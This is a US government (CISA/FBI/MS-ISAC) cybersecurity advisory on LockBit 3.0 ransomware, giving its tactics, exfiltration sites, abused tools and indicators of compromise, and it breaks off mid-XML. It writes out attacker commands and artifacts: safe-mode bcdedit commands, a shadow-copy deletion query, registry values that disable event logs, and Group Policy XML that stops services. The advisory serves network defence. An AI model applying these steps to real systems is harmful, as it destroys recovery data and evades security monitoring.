{"markdown": "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n \\#StopRansomware: LockBit 3\\.0 \\| CISA\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Skip to main content](#main) \n\n\n\n\n\n\n\n\n\n\n\n\n![U.S. flag](/profiles/cisad8_gov/themes/custom/gesso/dist/images/us_flag_small.png)\n\n\n\n An official website of the United States government\n \n\n\n\n Here\u2019s how you know\n \n\n\n\n\n\n Here\u2019s how you know\n \n\n\n\n\n\n\n![Dot gov](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-dot-gov.svg)\n\n\n**Official websites use .gov** \n  \n\n A\n **.gov** \n website belongs to an official government organization in the United States.\n \n\n\n\n\n\n![HTTPS](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-https.svg)\n\n\n**Secure .gov websites use HTTPS** \n  \n\n A\n **lock** \n (\n \n\n\n Lock\n \n\n A locked padlock\n \n\n\n\n\n ) or\n **https://** \n means you\u2019ve safely connected to the .gov website. Share sensitive information only on official, secure websites.\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools \"Free Cyber Services\") \n[\\#protect2024](/protect2024) \n[Secure Our World](/node/18883) \n[Shields Up](/node/8056) \n[Report A Cyber Issue](/node/16591) \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[![CISA Logo Americas Cyber Defense Agency](/sites/default/files/images/SVG/header_logo_tagline_update.svg)](/)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[![CISA Logo](/sites/default/files/images/SVG/mobile_logo_wordmark.svg)](/)\n\n\n\n\n\n\n\n\n\n\n Search\n \n\n\n\n\n\n\n\n\n\n Menu\n \n\n\n\n\n\n\n\n\n\n\n\n\n![America's Cyber Defense Agency](/sites/default/files/images/SVG/header_tagline_mobile_update.svg)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Close\n \n\n\n\n\n* Topics\n \n\n\n\n[Topics](/topics) \n\n\n\n\n[Cybersecurity Best Practices](/topics/cybersecurity-best-practices)\n\n\n\n\n[Cyber Threats and Advisories](/topics/cyber-threats-and-advisories)\n\n\n\n\n[Critical Infrastructure Security and Resilience](/topics/critical-infrastructure-security-and-resilience)\n\n\n\n\n[Election Security](/topics/election-security)\n\n\n\n\n[Emergency Communications](/topics/emergency-communications)\n\n\n\n\n[Industrial Control Systems](/topics/industrial-control-systems)\n\n\n\n\n[Information and Communications Technology Supply Chain Security](/topics/information-communications-technology-supply-chain-security)\n\n\n\n\n[Partnerships and Collaboration](/topics/partnerships-and-collaboration)\n\n\n\n\n[Physical Security](/topics/physical-security)\n\n\n\n\n[Risk Management](/topics/risk-management)\n\n\n\n\n\n[How can we help?](/audiences) \n\n\n[Government](/topics/government) \n[Educational Institutions](/topics/educational-institutions) \n[Industry](/topics/industry) \n[State, Local, Tribal, and Territorial](/topics/state-local-tribal-and-territorial) \n[Individuals and Families](/topics/individuals-and-families) \n[Small and Medium Businesses](/topics/small-and-medium-businesses) \n[Find Help Locally](/audiences/find-help-locally) \n[Faith\\-Based Community](/audiences/faith-based-community) \n[Executives](/audiences/executives) \n[High\\-Risk Communities](/audiences/high-risk-communities)\n* [Spotlight](/spotlight)\n* Resources \\& Tools\n \n\n\n\n[Resources \\& Tools](/resources-tools) \n\n\n\n\n[All Resources \\& Tools](/resources-tools/all-resources-tools)\n\n\n\n\n[Services](/resources-tools/services)\n\n\n\n\n[Programs](/resources-tools/programs)\n\n\n\n\n[Resources](/resources-tools/resources)\n\n\n\n\n[Training](/resources-tools/training)\n\n\n\n\n[Groups](/resources-tools/groups)\n* News \\& Events\n \n\n\n\n[News \\& Events](/news-events) \n\n\n\n\n[News](/news-events/news)\n\n\n\n\n[Events](/news-events/events)\n\n\n\n\n[Cybersecurity Alerts \\& Advisories](/news-events/cybersecurity-advisories)\n\n\n\n\n[Directives](/news-events/directives)\n\n\n\n\n[Request a CISA Speaker](/news-events/request-speaker)\n\n\n\n\n[Congressional Testimony](/news-events/congressional-testimony)\n\n\n\n\n[CISA Conferences](/cisa-conferences)\n\n\n\n\n[CISA Live!](/cisa-live)\n* Careers\n \n\n\n\n[Careers](/careers) \n\n\n\n\n[Benefits \\& Perks](/careers/benefits-perks)\n\n\n\n\n[HireVue Applicant Reasonable Accommodations Process](/careers/hirevue-applicant-reasonable-accommodations-process)\n\n\n\n\n[Hiring](/general-recruitment-and-hiring-faqs)\n\n\n\n\n[Resume \\& Application Tips](/careers/resume-application-tips)\n\n\n\n\n[Students \\& Recent Graduates](/students-recent-graduates-employment-opportunities)\n\n\n\n\n[Veteran and Military Spouses](/careers/veteran-and-military-spouse-employment-opportunities)\n\n\n\n\n[Work @ CISA](/careers/work-cisa)\n* About\n \n\n\n\n[About](/about) \n\n\n\n\n[Culture](/about/culture)\n\n\n\n\n[Divisions \\& Offices](/about/divisions-offices)\n\n\n\n\n[Regions](/about/regions)\n\n\n\n\n[Leadership](/about/leadership)\n\n\n\n\n[Doing Business with CISA](/doing-business-cisa)\n\n\n\n\n[Site Links](/site-links)\n\n\n\n\n[Reporting Employee and Contractor Misconduct](/reporting-employee-and-contractor-misconduct)\n\n\n\n\n[CISA GitHub](/cisa-github)\n\n\n\n\n[CISA Central](/cisa-central)\n\n\n\n\n[2023 Year In Review](/about/2023YIR)\n\n\n\n\n[Contact Us](/about/contact-us)\n\n\n\n\n\n\n\n\n\n[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools \"Free Cyber Services\") \n[\\#protect2024](/protect2024) \n[Secure Our World](/node/18883) \n[Shields Up](/node/8056) \n[Report A Cyber Issue](/node/16591) \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Breadcrumb\n \n1. [Home](/)\n2. [News \\& Events](/news-events)\n3. [Cybersecurity Advisories](/news-events/cybersecurity-advisories)\n4. [Cybersecurity Advisory](/news-events/cybersecurity-advisories?f%5B0%5D=advisory_type%3A94)\n\n\n\n\n\n\n\n\n Share:\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Cybersecurity Advisory\n \n\\#StopRansomware: LockBit 3\\.0\n==============================\n\n\n\n\n\n Release Date\n \n\n\n March 16, 2023\n \n\n\n\n\n Alert Code\n \n\n AA23\\-075A\n \n\n\n\n\n Related topics:\n \n\n[Malware, Phishing, and Ransomware](/topics/cyber-threats-and-advisories/malware-phishing-and-ransomware) \n ,\n [Cyber Threats and Advisories](/topics/cyber-threats-and-advisories) \n\n\n\n\n\n\n\n\n\n\n\n\n\n#### **SUMMARY**\n\n\n\n*Note: this joint Cybersecurity Advisory (CSA) is part of an ongoing \\#StopRansomware effort to publish advisories for network defenders that detail ransomware variants and ransomware threat actors. These \\#StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all \\#StopRansomware advisories and to learn more about other ransomware threats and no\\-cost resources.* \n\n\n\n\n**Actions to take today to mitigate cyber threats from ransomware:** \n\n\n\n* Prioritize remediating\n [known exploited vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) \n .\n* Train users to recognize and report\n [phishing attempts](https://www.cisa.gov/phishing-infographic) \n .\n* Enable and enforce phishing\\- resistant\n [multifactor authentication](https://www.cisa.gov/mfa) \n .\n\n\n\n The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Multi\\-State Information Sharing \\& Analysis Center (MS\\-ISAC) are releasing this joint CSA to disseminate known LockBit 3\\.0 ransomware IOCs and TTPs identified through FBI investigations as recently as March 2023\\.\n \n\n\n\n The LockBit 3\\.0 ransomware operations function as a Ransomware\\-as\\-a\\-Service (RaaS) model and is a continuation of previous versions of the ransomware, LockBit 2\\.0, and LockBit. Since January 2020, LockBit has functioned as an affiliate\\-based ransomware variant; affiliates deploying the LockBit RaaS use many varying TTPs and attack a wide range of businesses and critical infrastructure organizations, which can make effective computer network defense and mitigation challenging.\n \n\n\n\n The FBI, CISA, and the MS\\-ISAC encourage organizations to implement the recommendations in the mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.\n \n\n\n\n Download the PDF version of this report:\n \n\n\n\n\n[\\#StopRansomware: Lockbit](/sites/default/files/2023-03/aa23-075a-stop-ransomware-lockbit.pdf) \n\n (PDF, 688\\.70 KB\n )\n \n\n\n#### **TECHNICAL DETAILS**\n\n\n\n*Note: This advisory uses the MITRE ATT\\&CK\u00ae for Enterprise framework, version 12\\. See the MITRE ATT\\&CK Tactics and Techniques section for a table of the threat actors\u2019 activity mapped to* \n[*MITRE ATT\\&CK for Enterprise*](https://attack.mitre.org/versions/v12/matrices/enterprise/)\n*.* \n\n\n\n##### CAPABILITIES\n\n\n\n LockBit 3\\.0, also known as \u201cLockBit Black,\u201d is more modular and evasive than its previous versions and shares similarities with Blackmatter and Blackcat ransomware.\n \n\n\n\n LockBit 3\\.0 is configured upon compilation with many different options that determine the behavior of the ransomware. Upon the actual execution of the ransomware within a victim environment, various arguments can be supplied to further modify the behavior of the ransomware. For example, LockBit 3\\.0 accepts additional arguments for specific operations in lateral movement and rebooting into Safe Mode (see LockBit Command Line parameters under Indicators of Compromise). If a LockBit affiliate does not have access to passwordless LockBit 3\\.0 ransomware, then a password argument is mandatory during the execution of the ransomware. LockBit 3\\.0 affiliates failing to enter the correct password will be unable to execute the ransomware \\[\n [T1480\\.001](https://attack.mitre.org/versions/v12/techniques/T1480/001/) \n ]. The password is a cryptographic key which decodes the LockBit 3\\.0 executable. By protecting the code in such a manner, LockBit 3\\.0 hinders malware detection and analysis with the code being unexecutable and unreadable in its encrypted form. Signature\\-based detections may fail to detect the LockBit 3\\.0 executable as the executable\u2019s encrypted potion will vary based on the cryptographic key used for encryption while also generating a unique hash. When provided the correct password, LockBit 3\\.0 will decrypt the main component, continue to decrypt or decompress its code, and execute the ransomware.\n \n\n\n\n LockBit 3\\.0 will only infect machines that do not have language settings matching a defined exclusion list. However, whether a system language is checked at runtime is determined by a configuration flag originally set at compilation time. Languages on the exclusion list include, but are not limited to, Romanian (Moldova), Arabic (Syria), and Tatar (Russia). If a language from the exclusion list is detected \\[\n [T1614\\.001](https://attack.mitre.org/versions/v12/techniques/T1614/001/) \n ], LockBit 3\\.0 will stop execution without infecting the system.\n \n\n\n##### INITIAL ACCESS\n\n\n\n Affiliates deploying LockBit 3\\.0 ransomware gain initial access to victim networks via remote desktop protocol (RDP) exploitation \\[\n [T1133](https://attack.mitre.org/versions/v12/techniques/T1133/) \n ], drive\\-by compromise \\[\n [T1189](https://attack.mitre.org/versions/v12/techniques/T1189/) \n ], phishing campaigns \\[\n [T1566](https://attack.mitre.org/versions/v12/techniques/T1566/) \n ], abuse of valid accounts \\[\n [T1078](https://attack.mitre.org/versions/v12/techniques/T1078/) \n ], and exploitation of public\\-facing applications \\[\n [T1190](https://attack.mitre.org/versions/v12/techniques/T1190/) \n ].\n \n\n\n##### EXECUTION AND INFECTION PROCESS\n\n\n\n During the malware routine, if privileges are not sufficient, LockBit 3\\.0 attempts to escalate to the required privileges \\[\n [TA0004](https://attack.mitre.org/versions/v12/tactics/TA0004/) \n ]. LockBit 3\\.0 performs functions such as:\n \n\n\n* Enumerating system information such as hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices \\[\n [T1082](https://attack.mitre.org/versions/v12/techniques/T1082/) \n ]\n* Terminating processes and services \\[\n [T1489](https://attack.mitre.org/versions/v12/techniques/T1489/) \n ]\n* Launching commands \\[\n [TA0002](https://attack.mitre.org/versions/v12/tactics/TA0002/) \n ]\n* Enabling automatic logon for persistence and privilege escalation \\[\n [T1547](https://attack.mitre.org/versions/v12/techniques/T1547/) \n ]\n* Deleting log files, files in the recycle bin folder, and shadow copies residing on disk \\[\n [T1485](https://attack.mitre.org/versions/v12/techniques/T1485/) \n ], \\[\n [T1490](https://attack.mitre.org/versions/v12/techniques/T1490/) \n ]\n\n\n\n LockBit 3\\.0 attempts to spread across a victim network by using a preconfigured list of credentials hardcoded at compilation time or a compromised local account with elevated privileges \\[\n [T1078](https://attack.mitre.org/versions/v12/techniques/T1078/002/) \n ]. When compiled, LockBit 3\\.0 may also enable options for spreading via Group Policy Objects and PsExec using the Server Message Block (SMB) protocol. LockBit 3\\.0 attempts to encrypt \\[\n [T1486](https://attack.mitre.org/versions/v12/techniques/T1486/) \n ] data saved to any local or remote device, but skips files associated with core system functions.\n \n\n\n\n After files are encrypted, LockBit 3\\.0 drops a ransom note with the new filename\n **\\<Ransomware ID\\>.README.txt** \n and changes the host\u2019s wallpaper and icons to LockBit 3\\.0 branding \\[\n [T1491\\.001](https://attack.mitre.org/versions/v12/techniques/T1491/001/) \n ]. If needed, LockBit 3\\.0 will send encrypted host and bot information to a command and control (C2\\) server \\[\n [T1027](https://attack.mitre.org/versions/v12/techniques/T1027/) \n ].\n \n\n\n\n Once completed, LockBit 3\\.0 may delete itself from the disk \\[\n [T1070\\.004](https://attack.mitre.org/versions/v12/techniques/T1070/004/) \n ] as well as any Group Policy updates that were made, depending on which options were set at compilation time.\n \n\n\n##### EXFILTRATION\n\n\n\n LockBit 3\\.0 affiliates use Stealbit, a custom exfiltration tool used previously with LockBit 2\\.0 \\[\n [TA0010](https://attack.mitre.org/versions/v12/tactics/TA0010/) \n ]; rclone, an open\\-source command line cloud storage manager \\[\n [T1567\\.002](https://attack.mitre.org/versions/v12/techniques/T1567/002/) \n ]; and publicly available file sharing services, such as MEGA \\[\n [T1567\\.002](https://attack.mitre.org/versions/v12/techniques/T1567/002/) \n ], to exfiltrate sensitive company data files prior to encryption. While rclone and many publicly available file sharing services are primarily used for legitimate purposes, they can also be used by threat actors to aid in system compromise, network exploration, or data exfiltration. LockBit 3\\.0 affiliates often use other publicly available file sharing services to exfiltrate data as well \\[\n [T1567](https://attack.mitre.org/versions/v12/techniques/T1567/002/) \n ] (see Table 1\\).\n \n\n\n\n\n\n***Table 1: Anonymous File Sharing Sites Used to Exfiltrate Data Before System Encryption***\n\n| **File Sharing Site** |\n| --- |\n| https://www.premiumize\\[.]com |\n| https://anonfiles\\[.]com |\n| https://www.sendspace\\[.]com |\n| https://fex\\[.]net |\n| https://transfer\\[.]sh |\n| https://send.exploit\\[.]in |\n\n\n##### LEVERAGING FREEWARE AND OPEN\\-SOURCE TOOLS\n\n\n\n LockBit affiliates have been observed using various freeware and open\\-source tools during their intrusions. These tools are used for a range of activities such as network reconnaissance, remote access and tunneling, credential dumping, and file exfiltration. Use of PowerShell and Batch scripts\n   \n\n are observed across most intrusions, which focus on system discovery, reconnaissance, password/credential hunting, and privilege escalation. Artifacts of professional penetration\\-testing tools such as Metasploit and Cobalt Strike have also been observed. See Table 2 for a list of legitimate freeware and open\\-source tools LockBit affiliates have repurposed for ransomware operations:\n \n\n\n\n\n\n*Table 2: Freeware and Open\\-Source Tools Used by LockBit 3\\.0 Affiliates* \n\n| **Tool** | **Description** | **MITRE ATT\\&CK ID** |\n| --- | --- | --- |\n| Chocolatey | Command\\-line package manager for Windows. | [T1072](https://attack.mitre.org/versions/v12/techniques/T1072/) |\n| FileZilla | Cross\\-platform File Transfer Protocol (FTP) application. | [T1071\\.002](https://attack.mitre.org/versions/v12/techniques/T1071/002/) |\n| Impacket | Collection of Python classes for working with network protocols. | [S0357](https://attack.mitre.org/versions/v12/software/S0357/) |\n| MEGA Ltd MegaSync | Cloud\\-based synchronization tool. | [T1567\\.002](https://attack.mitre.org/versions/v12/techniques/T1567/002/) |\n| Microsoft Sysinternals ProcDump | Generates crash dumps. Commonly used to dump the contents of Local Security Authority Subsystem Service, LSASS.exe. | [T1003\\.001](https://attack.mitre.org/versions/v12/techniques/T1003/001/) |\n| Microsoft Sysinternals PsExec | Execute a command\\-line process on a remote machine. | [S0029](https://attack.mitre.org/versions/v12/software/S0029/) |\n| Mimikatz | Extracts credentials from system. | [S0002](https://attack.mitre.org/versions/v12/software/S0002/) |\n| Ngrok | Legitimate remote\\-access tool abused to bypass victim network protections. | [S0508](https://attack.mitre.org/versions/v12/software/S0508/) |\n| PuTTY Link (Plink) | Can be used to automate Secure Shell (SSH) actions on Windows. | [T1572](https://attack.mitre.org/versions/v12/techniques/T1572/) |\n| Rclone | Command\\-line program to manage cloud storage files | [S1040](https://attack.mitre.org/versions/v12/software/S1040/) |\n| SoftPerfect Network Scanner | Performs network scans. | [T1046](https://attack.mitre.org/versions/v12/techniques/T1046/) |\n| Splashtop | Remote\\-desktop software. | [T1021\\.001](https://attack.mitre.org/versions/v12/techniques/T1021/001/) |\n| WinSCP | SSH File Transfer Protocol client for Windows. | [T1048](https://attack.mitre.org/versions/v12/techniques/T1048/) |\n\n\n###### Indicators of Compromise (IOCs)\n\n\n\n The IOCs and malware characteristics outlined below were derived from field analysis. The following samples are current as of March 2023\\.\n \n\n\n\n***LockBit 3\\.0 Black Icon***\n\n\n\n\n\n![LockBit 3.0 black icon.](/sites/default/files/styles/large/public/2023-03/picture1_0.jpg?itok=B28eB1c9)\n\n\n\n\n\n\n\n\n\n\n\n***LockBit 3\\.0 Wallpaper***\n\n\n\n\n\n![Rectangular wallpaper reading \"LockBit Black: All your important files are stolen and encrypted! You must find [blank].README.text file and follow the instruction!\"](/sites/default/files/styles/large/public/2023-03/picture2.jpg?itok=eYzrYF9B)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n***LockBit Command Line Parameters***\n\n\n\n\n\n| **LockBit Parameters** | **Description** |\n| --- | --- |\n| \\-del | Self\\-delete. |\n| \\-gdel | Remove LockBit 3\\.0 group policy changes. |\n| \\-gspd | Spread laterally via group policy. |\n| \\-pass (32 character value) | (Required) Password used to launch LockBit 3\\.0\\. |\n| \\-path (File or path) | Only encrypts provided file or folder. |\n| \\-psex | Spread laterally via admin shares. |\n| \\-safe | Reboot host into Safe Mode. |\n| \\-wall | Sets LockBit 3\\.0 Wallpaper and prints out LockBit 3\\.0 ransom note. |\n\n\n###### Mutual Exclusion Object (Mutex) Created\n\n\n\n When executed, LockBit 3\\.0 will create the mutex, Global\\\\\\<MD4 hash of machine GUID\\>,\n   \n\n and check to see if this mutex has already been created to avoid running more than one instance of the ransomware.\n \n\n\n###### UAC Bypass via Elevated COM Interface\n\n\n\n LockBit 3\\.0 is capable of bypassing User Account Control (UAC) to execute code with elevated privileges via elevated Component Object Model (COM) Interface.\n **C:\\\\Windows\\\\System32\\\\dllhost.exe** \n is spawned with high integrity with the command line GUID\n **3E5FC7F9\\-9A51\\-4367\\-9063\\-A120244FBEC** \n .\n \n\n\n\n For example,\n **%SYSTEM32%\\\\dllhost.exe/Processid:{3E5FC7F9\\-9A51\\-4367\\-9063\\- A120244FBEC7}** \n .\n \n\n\n###### Volume Shadow Copy Deletion\n\n\n\n LockBit 3\\.0 uses Windows Management Instrumentation (WMI) to identify and delete Volume Shadow Copies. LockBit 3\\.0 uses\n **select \\* from Win32\\_ShadowCopy** \n to query for Volume Shadow copies,\n **Win32\\_ShadowCopy.ID** \n to obtain the ID of the shadow copy, and\n **DeleteInstance** \n to delete any shadow copies.\n \n\n\n###### Registry Artifacts\n\n\n\n***LockBit 3\\.0 Icon***\n\n\n\n\n\n| Registry Key | Value | Data |\n| --- | --- | --- |\n| HKCR\\\\. \\<Malware Extension\\> | (Default) | \\<Malware Extension\\> |\n| HKCR\\\\\\<Malware Extension\\>\\\\DefaultIcon | (Default) | C:\\\\ProgramData\\\\\\<Mal ware Extension\\>.ico |\n\n\n\n***LockBit 3\\.0 Wallpaper***\n\n\n\n\n\n| Registry Key | Value | Data |\n| --- | --- | --- |\n| HKCU\\\\Control Panel\\\\Desktop\\\\WallPaper | (Default) | C:\\\\ProgramData\\\\\\<Mal ware Extension\\>.bmp |\n\n\n\n***Disable Privacy Settings Experience***\n\n\n\n\n\n| Registry Key | Value | Data |\n| --- | --- | --- |\n| SOFTWARE\\\\Policies\\\\Microsoft\\\\Win dows\\\\OOBE | DisablePrivacyE xperience | 0 |\n\n\n\n***Enable Automatic Logon***\n\n\n\n\n\n| Registry Key | Value | Data |\n| --- | --- | --- |\n| SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon | AutoAdminLogon | 1 |\n|  | DefaultUserName | \\<username\\> |\n|  | DefaultDomainNa me | \\<domain name\\> |\n|  | DefaultPassword | \\<password\\> |\n\n\n\n***Disable and Clear Windows Event Logs***\n\n\n\n\n\n| Registry Key | Value | Data |\n| --- | --- | --- |\n| HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows \\\\CurrentVersion\\\\WINEVT\\\\Channels \\\\\\* | Enabled | 0 |\n| HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows \\\\CurrentVersion\\\\WINEVT\\\\Channels \\\\\\* \\\\ChannelAccess | ChannelAccess | AO:BAG:SYD:(A;;0x1;; ;SY)(A;;0x5;;;BA)(A; ;0x1;;;LA) |\n\n\n###### Ransom Locations\n\n\n\n\n| LockBit 3\\.0 File Path Locations |\n| --- |\n| ADMIN$\\\\Temp\\\\\\<LockBit3\\.0 Filename\\>.exe |\n| %SystemRoot%\\\\Temp\\\\\\<LockBit3\\.0 Filename\\>.exe |\n| \\\\\\<Domain Name\\>\\\\sysvol\\\\\\<Domain Name\\>\\\\scripts\\\\\\<Lockbit 3\\.0 Filename\\>.exe (Domain Controller) |\n\n\n###### Safe Mode Launch Commands\n\n\n\n LockBit 3\\.0 has a Safe Mode feature to circumvent endpoint antivirus and detection. Depending upon the host operating system, the following command is launched to reboot the system to Safe Mode with Networking:\n \n\n\n\n\n| Operating System | Safe Mode with Networking command |\n| --- | --- |\n| Vista and newer | bcdedit /set {current} safeboot network |\n| Pre\\-Vista | bootcfg /raw /a /safeboot:network /id 1 |\n\n\n\n\n| Operating System | Disable Safe mode reboot |\n| --- | --- |\n| Vista and newer | bcdedit /deletevalue {current} safeboot |\n| Pre\\-Vista | bootcfg /raw /fastdetect /id 1 |\n\n\n###### Group Policy Artifacts\n\n\n\n The following are Group Policy Extensible Markup Language (XML) files identified after a LockBit 3\\.0 infection:\n \n\n\n\n\n| NetworkShares.xml |\n| --- |\n| \\<?xml version\\=\"1\\.0\" encoding\\=\"utf\\-8\"?\\>    \\<NetworkShareSettings clsid\\=\"{520870D8\\-A6E7\\-47e8\\-A8D8\\-E6A4E76EAEC2}\"\\>    \\<NetShare clsid\\=\"{2888C5E7\\-94FC\\-4739\\-90AA\\-2C1536D68BC0}\"    image\\=\"2\" name\\=\"%%ComputerName%%\\_D\" changed\\=\"%s\" uid\\=\"%s\"\\>    \\<Properties action\\=\"U\" name\\=\"%%ComputerName%%\\_D\" path\\=\"D:\" comment\\=\"\" allRegular\\=\"0\" allHidden\\=\"0\" allAdminDrive\\=\"0\" limitUsers\\=\"NO\\_CHANGE\" abe\\=\"NO\\_CHANGE\"/\\> |\n\n\n\n**Services.xml** \n stops and disables services on the Active Directory (AD) hosts.\n \n\n\n\n\n| Services.xml |\n| --- |\n| \\<?xml version\\=\"1\\.0\" encoding\\=\"utf\\-8\"?\\>    \\<NTServices clsid\\=\"{2CFB484A\\-4E96\\-4b5d\\-A0B6\\-093D2F91E6AE}\"\\>    \\<NTService clsid\\=\"{AB6F0B67\\-341F\\-4e51\\-92F9\\-005FBFBA1A43}\"    name\\=\"SQLPBDMS\" image\\=\"4\" changed\\=\"%s\" uid\\=\"%s\" disabled\\=\"0\"\\>    \\<Properties startupType\\=\"DISABLED\" serviceName\\=\"SQLPBDMS\" serviceAction\\=\"STOP\" timeout\\=\"30\"/\\>    \\</NTService\\>    \\<NTService clsid\\=\"{AB6F0B67\\-341F\\-4e51\\-92F9\\-005FBFBA1A43}\"    name\\=\"SQLPBENGINE\" image\\=\"4\" changed\\=\"%s\" uid\\=\"%s\" disabled\\=\"0\"\\>    \\<Properties startupType\\=\"DISABLED\" serviceName\\=\"SQLPBENGINE\" serviceAction\\=\"STOP\" timeout\\=\"30\"/\\>    \\</NTService\\>    \\<NTService clsid\\=\"{AB6F0B67\\-341F\\-4e51\\-92F9\\-005FBFBA1A43}\"    name\\=\"MSSQLFDLauncher\" image\\=\"4\" changed\\=\"%s\" uid\\=\"%s\" userContext\\=\"0\" removePolicy\\=\"0\" disabled\\=\"0\"\\>    \\<Properties startupType\\=\"DISABLED\" serviceName\\=\"MSSQLFDLauncher\" serviceAction\\=\"STOP\" timeout\\=\"30\"/\\>    \\</NTService\\>    \\<NTService clsid\\=\"{AB6F0B67\\-341F\\-4e51\\-92F9\\-005FBFBA1A43}\"    name\\=\"SQLSERVERAGENT\" image\\=\"4\" changed\\=\"%s\" uid\\=\"%s\" disabled\\=\"0\"\\>    \\<Properties startupType\\=\"DISABLED\" serviceName\\=\"SQLSERVERAGENT\" serviceAction\\=\"STOP\" timeout\\=\"30\"/\\>    \\</NTService\\>    \\<NTService clsid\\=\"{AB6F0B67\\-341F\\-4e51\\-92F9\\-005FBFBA1A43}\"    name\\=\"MSSQLServerOLAPService\" image\\=\"4\" changed\\=\"%s\" uid\\=\"%s\" disabled\\=\"0\"\\>    \\<Properties startupType\\=\"DISABLED\" serviceName\\=\"MSSQLServerOLAPService\" serviceAction\\=\"STOP\" timeout\\=\"30\"/\\>    \\</NTService\\>    \\<NTService clsid\\=\"{AB6F0B67\\-341F\\-4e51\\-92F9\\-005FBFBA1A43}\"    name\\=\"SSASTELEMETRY\" image\\=\"4\" changed\\=\"%s\" uid\\=\"%s\" disabled\\=\"0\"\\>    \\<Properties startupType\\=\"DISABLED\" serviceName\\=\"SSASTELEMETRY\" serviceAction\\=\"STOP\" timeout\\=\"30\"/\\>    \\</NTService\\>    \\<NTService clsid\\=\"{AB6F0B67\\-341F\\-4e51\\-92F9\\-005FBFBA1A43}\"    name\\=\"SQLBrowser\" image\\=\"4\" changed\\=\"%s\" uid\\=\"%s\" disabled\\=\"0\"\\>    \\<Properties startupType\\=\"DISABLED\" serviceName\\=\"SQLBrowser\" serviceAction\\=\"STOP\" timeout\\=\"30\"/\\>    \\</NTService\\>    \\<NTService clsid\\=\"{AB6F0B67\\-341F\\-4e51\\-92F9\\-005FBFBA1A43}\"    name\\=\"SQL Server Distributed Replay Client\" image\\=\"4\" changed\\=\"%s\" uid\\=\"%s\" disabled\\=\"0\"\\>    \\<Properties startupType\\=\"DISABLED\" serviceName\\=\"SQL Server Distributed Replay Client\" serviceAction\\=\"STOP\" timeout\\=\"30\"/\\>    \\</NTService\\>    \\<NTService clsid\\=\"{AB6F0B67\\-341F\\-4e51\\-92F9\\-005FBFBA1A43}\"    name\\=\"SQL Server Distributed Replay Controller\" image\\=\"4\" changed\\=\"%s\" uid\\=\"%s\" disabled\\=\"0\"\\>    \\<Properties startupType\\=\"DISABLED\" serviceName\\=\"SQL Server Distributed Replay Controller\" serviceAction\\=\"STOP\" timeout\\=\"30\"/\\>    \\</NTService\\>    \\<NTService clsid\\=\"{AB6F0B67\\-341F\\-4e51\\-92F9\\-005FBFBA1A43}\"    name\\=\"MsDtsServer150\" image\\=\"4\" changed\\=\"%s\" uid\\=\"%s\" disabled\\=\"0\"\\>    \\<Properties startupType\\=\"DISABLED\" serviceName\\=\"MsDtsServer150\" serviceAction\\=\"STOP\" timeout\\=\"30\"/\\>    \\</NTService\\>    \\<NTService clsid\\=\"{AB6F0B67\\-341F\\-4e51\\-92F9\\-005FBFBA1A43}\"    name\\=\"SSISTELEMETRY150\" image\\=\"4\" changed\\=\"%s\" uid\\=\"%s\" disabled\\=\"0\"\\>    \\<Properties startupType\\=\"DISABLED\" serviceName\\=\"SSISTELEMETRY150\" serviceAction\\=\"STOP\" timeout\\=\"30\"/\\>    \\</NTService\\>    \\<NTService clsid\\=\"{AB6F0B67\\-341F\\-4e51\\-92F9\\-005FBFBA1A43}\"    name\\=\"SSISScaleOutMaster150\" image\\=\"4\" changed\\=\"%s\" uid\\=\"%s\" disabled\\=\"0\"\\>    \\<Properties startupType\\=\"DISABLED\" serviceName\\=\"SSISScaleOutMaster150\" serviceAction\\=\"STOP\" timeout\\=\"30\"/\\>    \\</NTService\\>    \\<NTService clsid\\=\"{AB6F0B67\\-341F\\-4e51\\-92F9\\-005FBFBA1A43}\"    name\\=\"SSISScaleOutWorker150\" image\\=\"4\" changed\\=\"%s\" uid\\=\"%s\" disabled\\=\"0\"\\>    \\<Properties startupType\\=\"DISABLED\" serviceName\\=\"SSISScaleOutWorker150\" serviceAction\\=\"STOP\" timeout\\=\"30\"/\\>    \\</NTService\\>    \\<NTService clsid\\=\"{AB6F0B67\\-341F\\-4e51\\-92F9\\-005FBFBA1A43}\"    name\\=\"MSSQLLaunchpad\" image\\=\"4\" changed\\=\"%s\" uid\\=\"%s\" disabled\\=\"0\"\\>    \\<Properties startupType\\=\"DISABLED\" serviceName\\=\"MSSQLLaunchpad\" serviceAction\\=\"STOP\" timeout\\=\"30\"/\\>    \\</NTService\\>    \\<NTService clsid\\=\"{AB6F0B67\\-341F\\-4e51\\-92F9\\-005FBFBA1A43}\"    name\\=\"SQLWriter\" image\\=\"4\" changed\\=\"%s\" uid\\=\"%s\" disabled\\=\"0\"\\>    \\<Properties startupType\\=\"DISABLED\" serviceName\\=\"SQLWriter\" serviceAction\\=\"STOP\" timeout\\=\"30\"/\\>    \\</NTService\\>    \\<NTService clsid\\=\"{AB6F0B67\\-341F\\-4e51\\-92F9\\-005FBFBA1A43}\"    name\\=\"SQLTELEMETRY\" image\\=\"4\" changed\\=\"%s\" uid\\=\"%s\" disabled\\=\"0\"\\>    \\<Properties 